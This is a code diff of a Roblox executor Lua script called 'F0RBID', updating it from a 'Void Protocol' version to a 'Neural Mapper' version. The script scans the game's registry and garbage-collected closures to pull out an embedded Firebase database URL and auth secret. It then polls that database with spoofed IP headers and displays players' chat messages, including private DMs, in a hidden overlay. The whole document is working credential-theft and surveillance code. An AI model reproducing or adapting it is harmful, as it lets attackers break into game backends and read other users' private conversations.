@@ -1,23 +1,23 @@
 -- ========================================================== --
--- 🌑 F0RBID: THE VOID PROTOCOL (V16 - NO HOOK / NO KICK)
+-- 🌑 F0RBID V17: THE NEURAL MAPPER (DEEP PATH EXPOSE)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Void Protocol Activated. Identity Purged.")
+print("[F0RBID] 🛰️ Neural Mapper Engaged. Identity: [F0RBID_HIDDEN_OP]")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
-local processedData = {}
+local processedIds = {}
 
 local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID VOID UI (ULTRA-DARK AESTHETIC)
+-- 1. F0RBID PREMIUM UI (REFINED STEALTH)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-if uiParent:FindFirstChild("F0rbidVoid") then uiParent.F0rbidVoid:Destroy() end
+if uiParent:FindFirstChild("F0rbidNeural") then uiParent.F0rbidNeural:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "F0rbidVoid"
+ScreenGui.Name = "F0rbidNeural"
 ScreenGui.Parent = uiParent
 
 local Main = Instance.new("Frame")
@@ -33,17 +33,11 @@ local Corner = Instance.new("UICorner")
 Corner.CornerRadius = UDim.new(0, 8)
 Corner.Parent = Main
 
-local Glow = Instance.new("Frame")
-Glow.Size = UDim2.new(1, 0, 0, 3)
-Glow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Glow.BorderSizePixel = 0
-Glow.Parent = Main
-
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[THE VOID V16]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[NEURAL MAPPER V17]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -51,16 +45,16 @@ Title.TextSize = 19
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
-local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, -30, 0, 20)
-Status.Position = UDim2.new(0, 15, 0, 40)
-Status.BackgroundTransparency = 1
-Status.Text = "● IDENTITY: [F0RBID_HIDDEN_OP]"
-Status.TextColor3 = Color3.fromRGB(180, 0, 0)
-Status.Font = Enum.Font.Code
-Status.TextSize = 12
-Status.TextXAlignment = Enum.TextXAlignment.Left
-Status.Parent = Main
+local StatusLine = Instance.new("TextLabel")
+StatusLine.Size = UDim2.new(1, -30, 0, 20)
+StatusLine.Position = UDim2.new(0, 15, 0, 40)
+StatusLine.BackgroundTransparency = 1
+StatusLine.Text = "● STATUS: SEARCHING FOR CHAT STRUCTURE..."
+StatusLine.TextColor3 = Color3.fromRGB(150, 0, 0)
+StatusLine.Font = Enum.Font.Code
+StatusLine.TextSize = 12
+StatusLine.TextXAlignment = Enum.TextXAlignment.Left
+StatusLine.Parent = Main
 
 local Scroll = Instance.new("ScrollingFrame")
 Scroll.Size = UDim2.new(1, -20, 1, -110)
@@ -75,13 +69,13 @@ UIList.SortOrder = Enum.SortOrder.LayoutOrder
 UIList.Padding = UDim.new(0, 4)
 UIList.Parent = Scroll
 
-local function AddLog(tag, val)
+local function AddLog(tag, user, msg, col)
     local txt = Instance.new("TextLabel")
     txt.Size = UDim2.new(1, 0, 0, 0)
     txt.BackgroundTransparency = 1
     txt.RichText = true
-    txt.Text = string.format("<font color='#FF0000'>[%s]</font> %s", tag, tostring(val))
-    txt.TextColor3 = Color3.fromRGB(220, 220, 220)
+    txt.Text = string.format("<font color='#FF0000'>[%s]</font> <b>%s:</b> %s", tag, user, msg)
+    txt.TextColor3 = col or Color3.fromRGB(220, 220, 220)
     txt.Font = Enum.Font.Code
     txt.TextSize = 12
     txt.TextWrapped = true
@@ -94,52 +88,64 @@ local function AddLog(tag, val)
 end
 
 -- ========================================== --
--- 2. GREEDY VOID EXTRACTOR
+-- 2. SMART PATH MAPPING LOGIC
 -- ========================================== --
-local function VoidExtract(data, path, depth)
-    if type(data) ~= "table" or depth > 10 then return end
+local function NeuralScan(data, path, parent)
+    if type(data) ~= "table" then return end
     
-    for k, v in pairs(data) do
-        local currentPath = path .. "/" .. tostring(k)
-        if type(v) == "table" then
-            VoidExtract(v, currentPath, depth + 1)
-        else
-            local valStr = tostring(v)
-            if #valStr > 0 and not valStr:find("firebase") then
-                local dataId = currentPath .. valStr
-                if not processedData[dataId] then
-                    processedData[dataId] = true
-                    
-                    local tag = tostring(k)
-                    if #tostring(k) > 8 and tonumber(k) then tag = "SERVER_ID" end
-                    if currentPath:lower():find("dm") then tag = "DM_DATA" end
-                    
-                    AddLog(tag, valStr)
+    for key, val in pairs(data) do
+        local currentPath = path .. "/" .. tostring(key)
+        
+        if type(val) == "table" then
+            -- Identify potential message packets
+            local m = val.m or val.message or val.content or val.text or val.c
+            local u = val.n or val.u or val.sender or val.username or val.name or "Ghost"
+
+            -- If keys are missing, look for any text content (Server/DM logic)
+            if not m then
+                for subK, subV in pairs(val) do
+                    if type(subV) == "string" and #subV > 1 and not subV:find("firebase") then
+                        if #subV > 12 and tonumber(subV) then -- It's an ID
+                        elseif subK == "u" or subK == "n" then u = subV
+                        else m = subV end
+                    end
                 end
             end
+
+            if m and type(m) == "string" then
+                local tag = "LIVE"
+                if currentPath:lower():find("dm") then tag = "PRIVATE"
+                elseif #tostring(parent) > 8 then tag = "SERVER" end
+
+                local id = tostring(u)..tostring(m)..tag
+                if not processedIds[id] then
+                    processedIds[id] = true
+                    local col = (tag == "PRIVATE") and Color3.fromRGB(255, 100, 200) or Color3.fromRGB(255, 255, 255)
+                    AddLog(tag, tostring(u), tostring(m), col)
+                end
+            end
+            NeuralScan(val, currentPath, key)
         end
     end
 end
 
-local function StartVoidSync()
+local function StartNeuralSync()
     task.spawn(function()
         while task.wait(1.5) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
-                    -- GHOST REQUESTS (FULL IDENTITY MASKING)
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
-                            ["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
+                            ["User-Agent"] = "F0RBID-NEURAL-MAPPER/17.0",
                             ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(10,250), math.random(10,250), math.random(10,250), math.random(10,250)),
-                            ["X-Real-IP"] = string.format("%d.%d.%d.%d", math.random(10,250), math.random(10,250), math.random(10,250), math.random(10,250)),
-                            ["F0RBID-ENCRYPTED"] = "TRUE"
+                            ["Identity-Mask"] = "F0RBID_OP"
                         }
                     })
                     if res.Success then
                         local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then VoidExtract(decoded, "VOID", 0) end
+                        if decoded then NeuralScan(decoded, "ROOT", "ROOT") end
                     end
                 end)
             end
@@ -148,13 +154,12 @@ local function StartVoidSync()
 end
 
 -- ========================================== --
--- 3. PASSIVE MEMORY REFLECTION (ZERO HOOK)
+-- 3. PASSIVE REFLECTION (ZERO DETECTION)
 -- ========================================== --
 task.spawn(function()
     while not TARGET_URL do
-        -- SILENT REGISTRY SCAN
-        local reg = getreg()
-        for _, v in pairs(reg) do
+        -- Registry Scan (Silent)
+        for _, v in pairs(getreg()) do
             if type(v) == "table" then
                 for k2, v2 in pairs(v) do
                     local vs = tostring(v2)
@@ -166,19 +171,16 @@ task.spawn(function()
                 end
             end
         end
-
-        -- PASSIVE CONSTANT SCAN
+        -- GC Constant Scan
         if not TARGET_URL then
             for _, f in pairs(getgc()) do
                 if type(f) == "function" and islclosure(f) and not isexecutorclosure(f) then
-                    local constants = getconstants(f)
-                    for _, c in pairs(constants) do
+                    for _, c in pairs(getconstants(f)) do
                         if type(c) == "string" and c:find("firebaseio.com") then
                             TARGET_URL = c:match("(https://[%w%-]+%.firebaseio%.com)")
                         end
                     end
-                    local ups = getupvalues(f)
-                    for _, uv in pairs(ups) do
+                    for _, uv in pairs(getupvalues(f)) do
                         if type(uv) == "string" and #uv > 25 and not uv:find("/") then
                             TARGET_AUTH = uv
                         end
@@ -188,9 +190,9 @@ task.spawn(function()
         end
 
         if TARGET_URL and TARGET_AUTH then
-            Status.Text = "● IDENTITY: 🟢 INFILTRATION SUCCESSFUL"
-            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
-            StartVoidSync()
+            StatusLine.Text = "● IDENTITY: 🟢 F0RBID_INFILTRATION_SUCCESSFUL"
+            StatusLine.TextColor3 = Color3.fromRGB(0, 255, 0)
+            StartNeuralSync()
             break
         end
         task.wait(2)
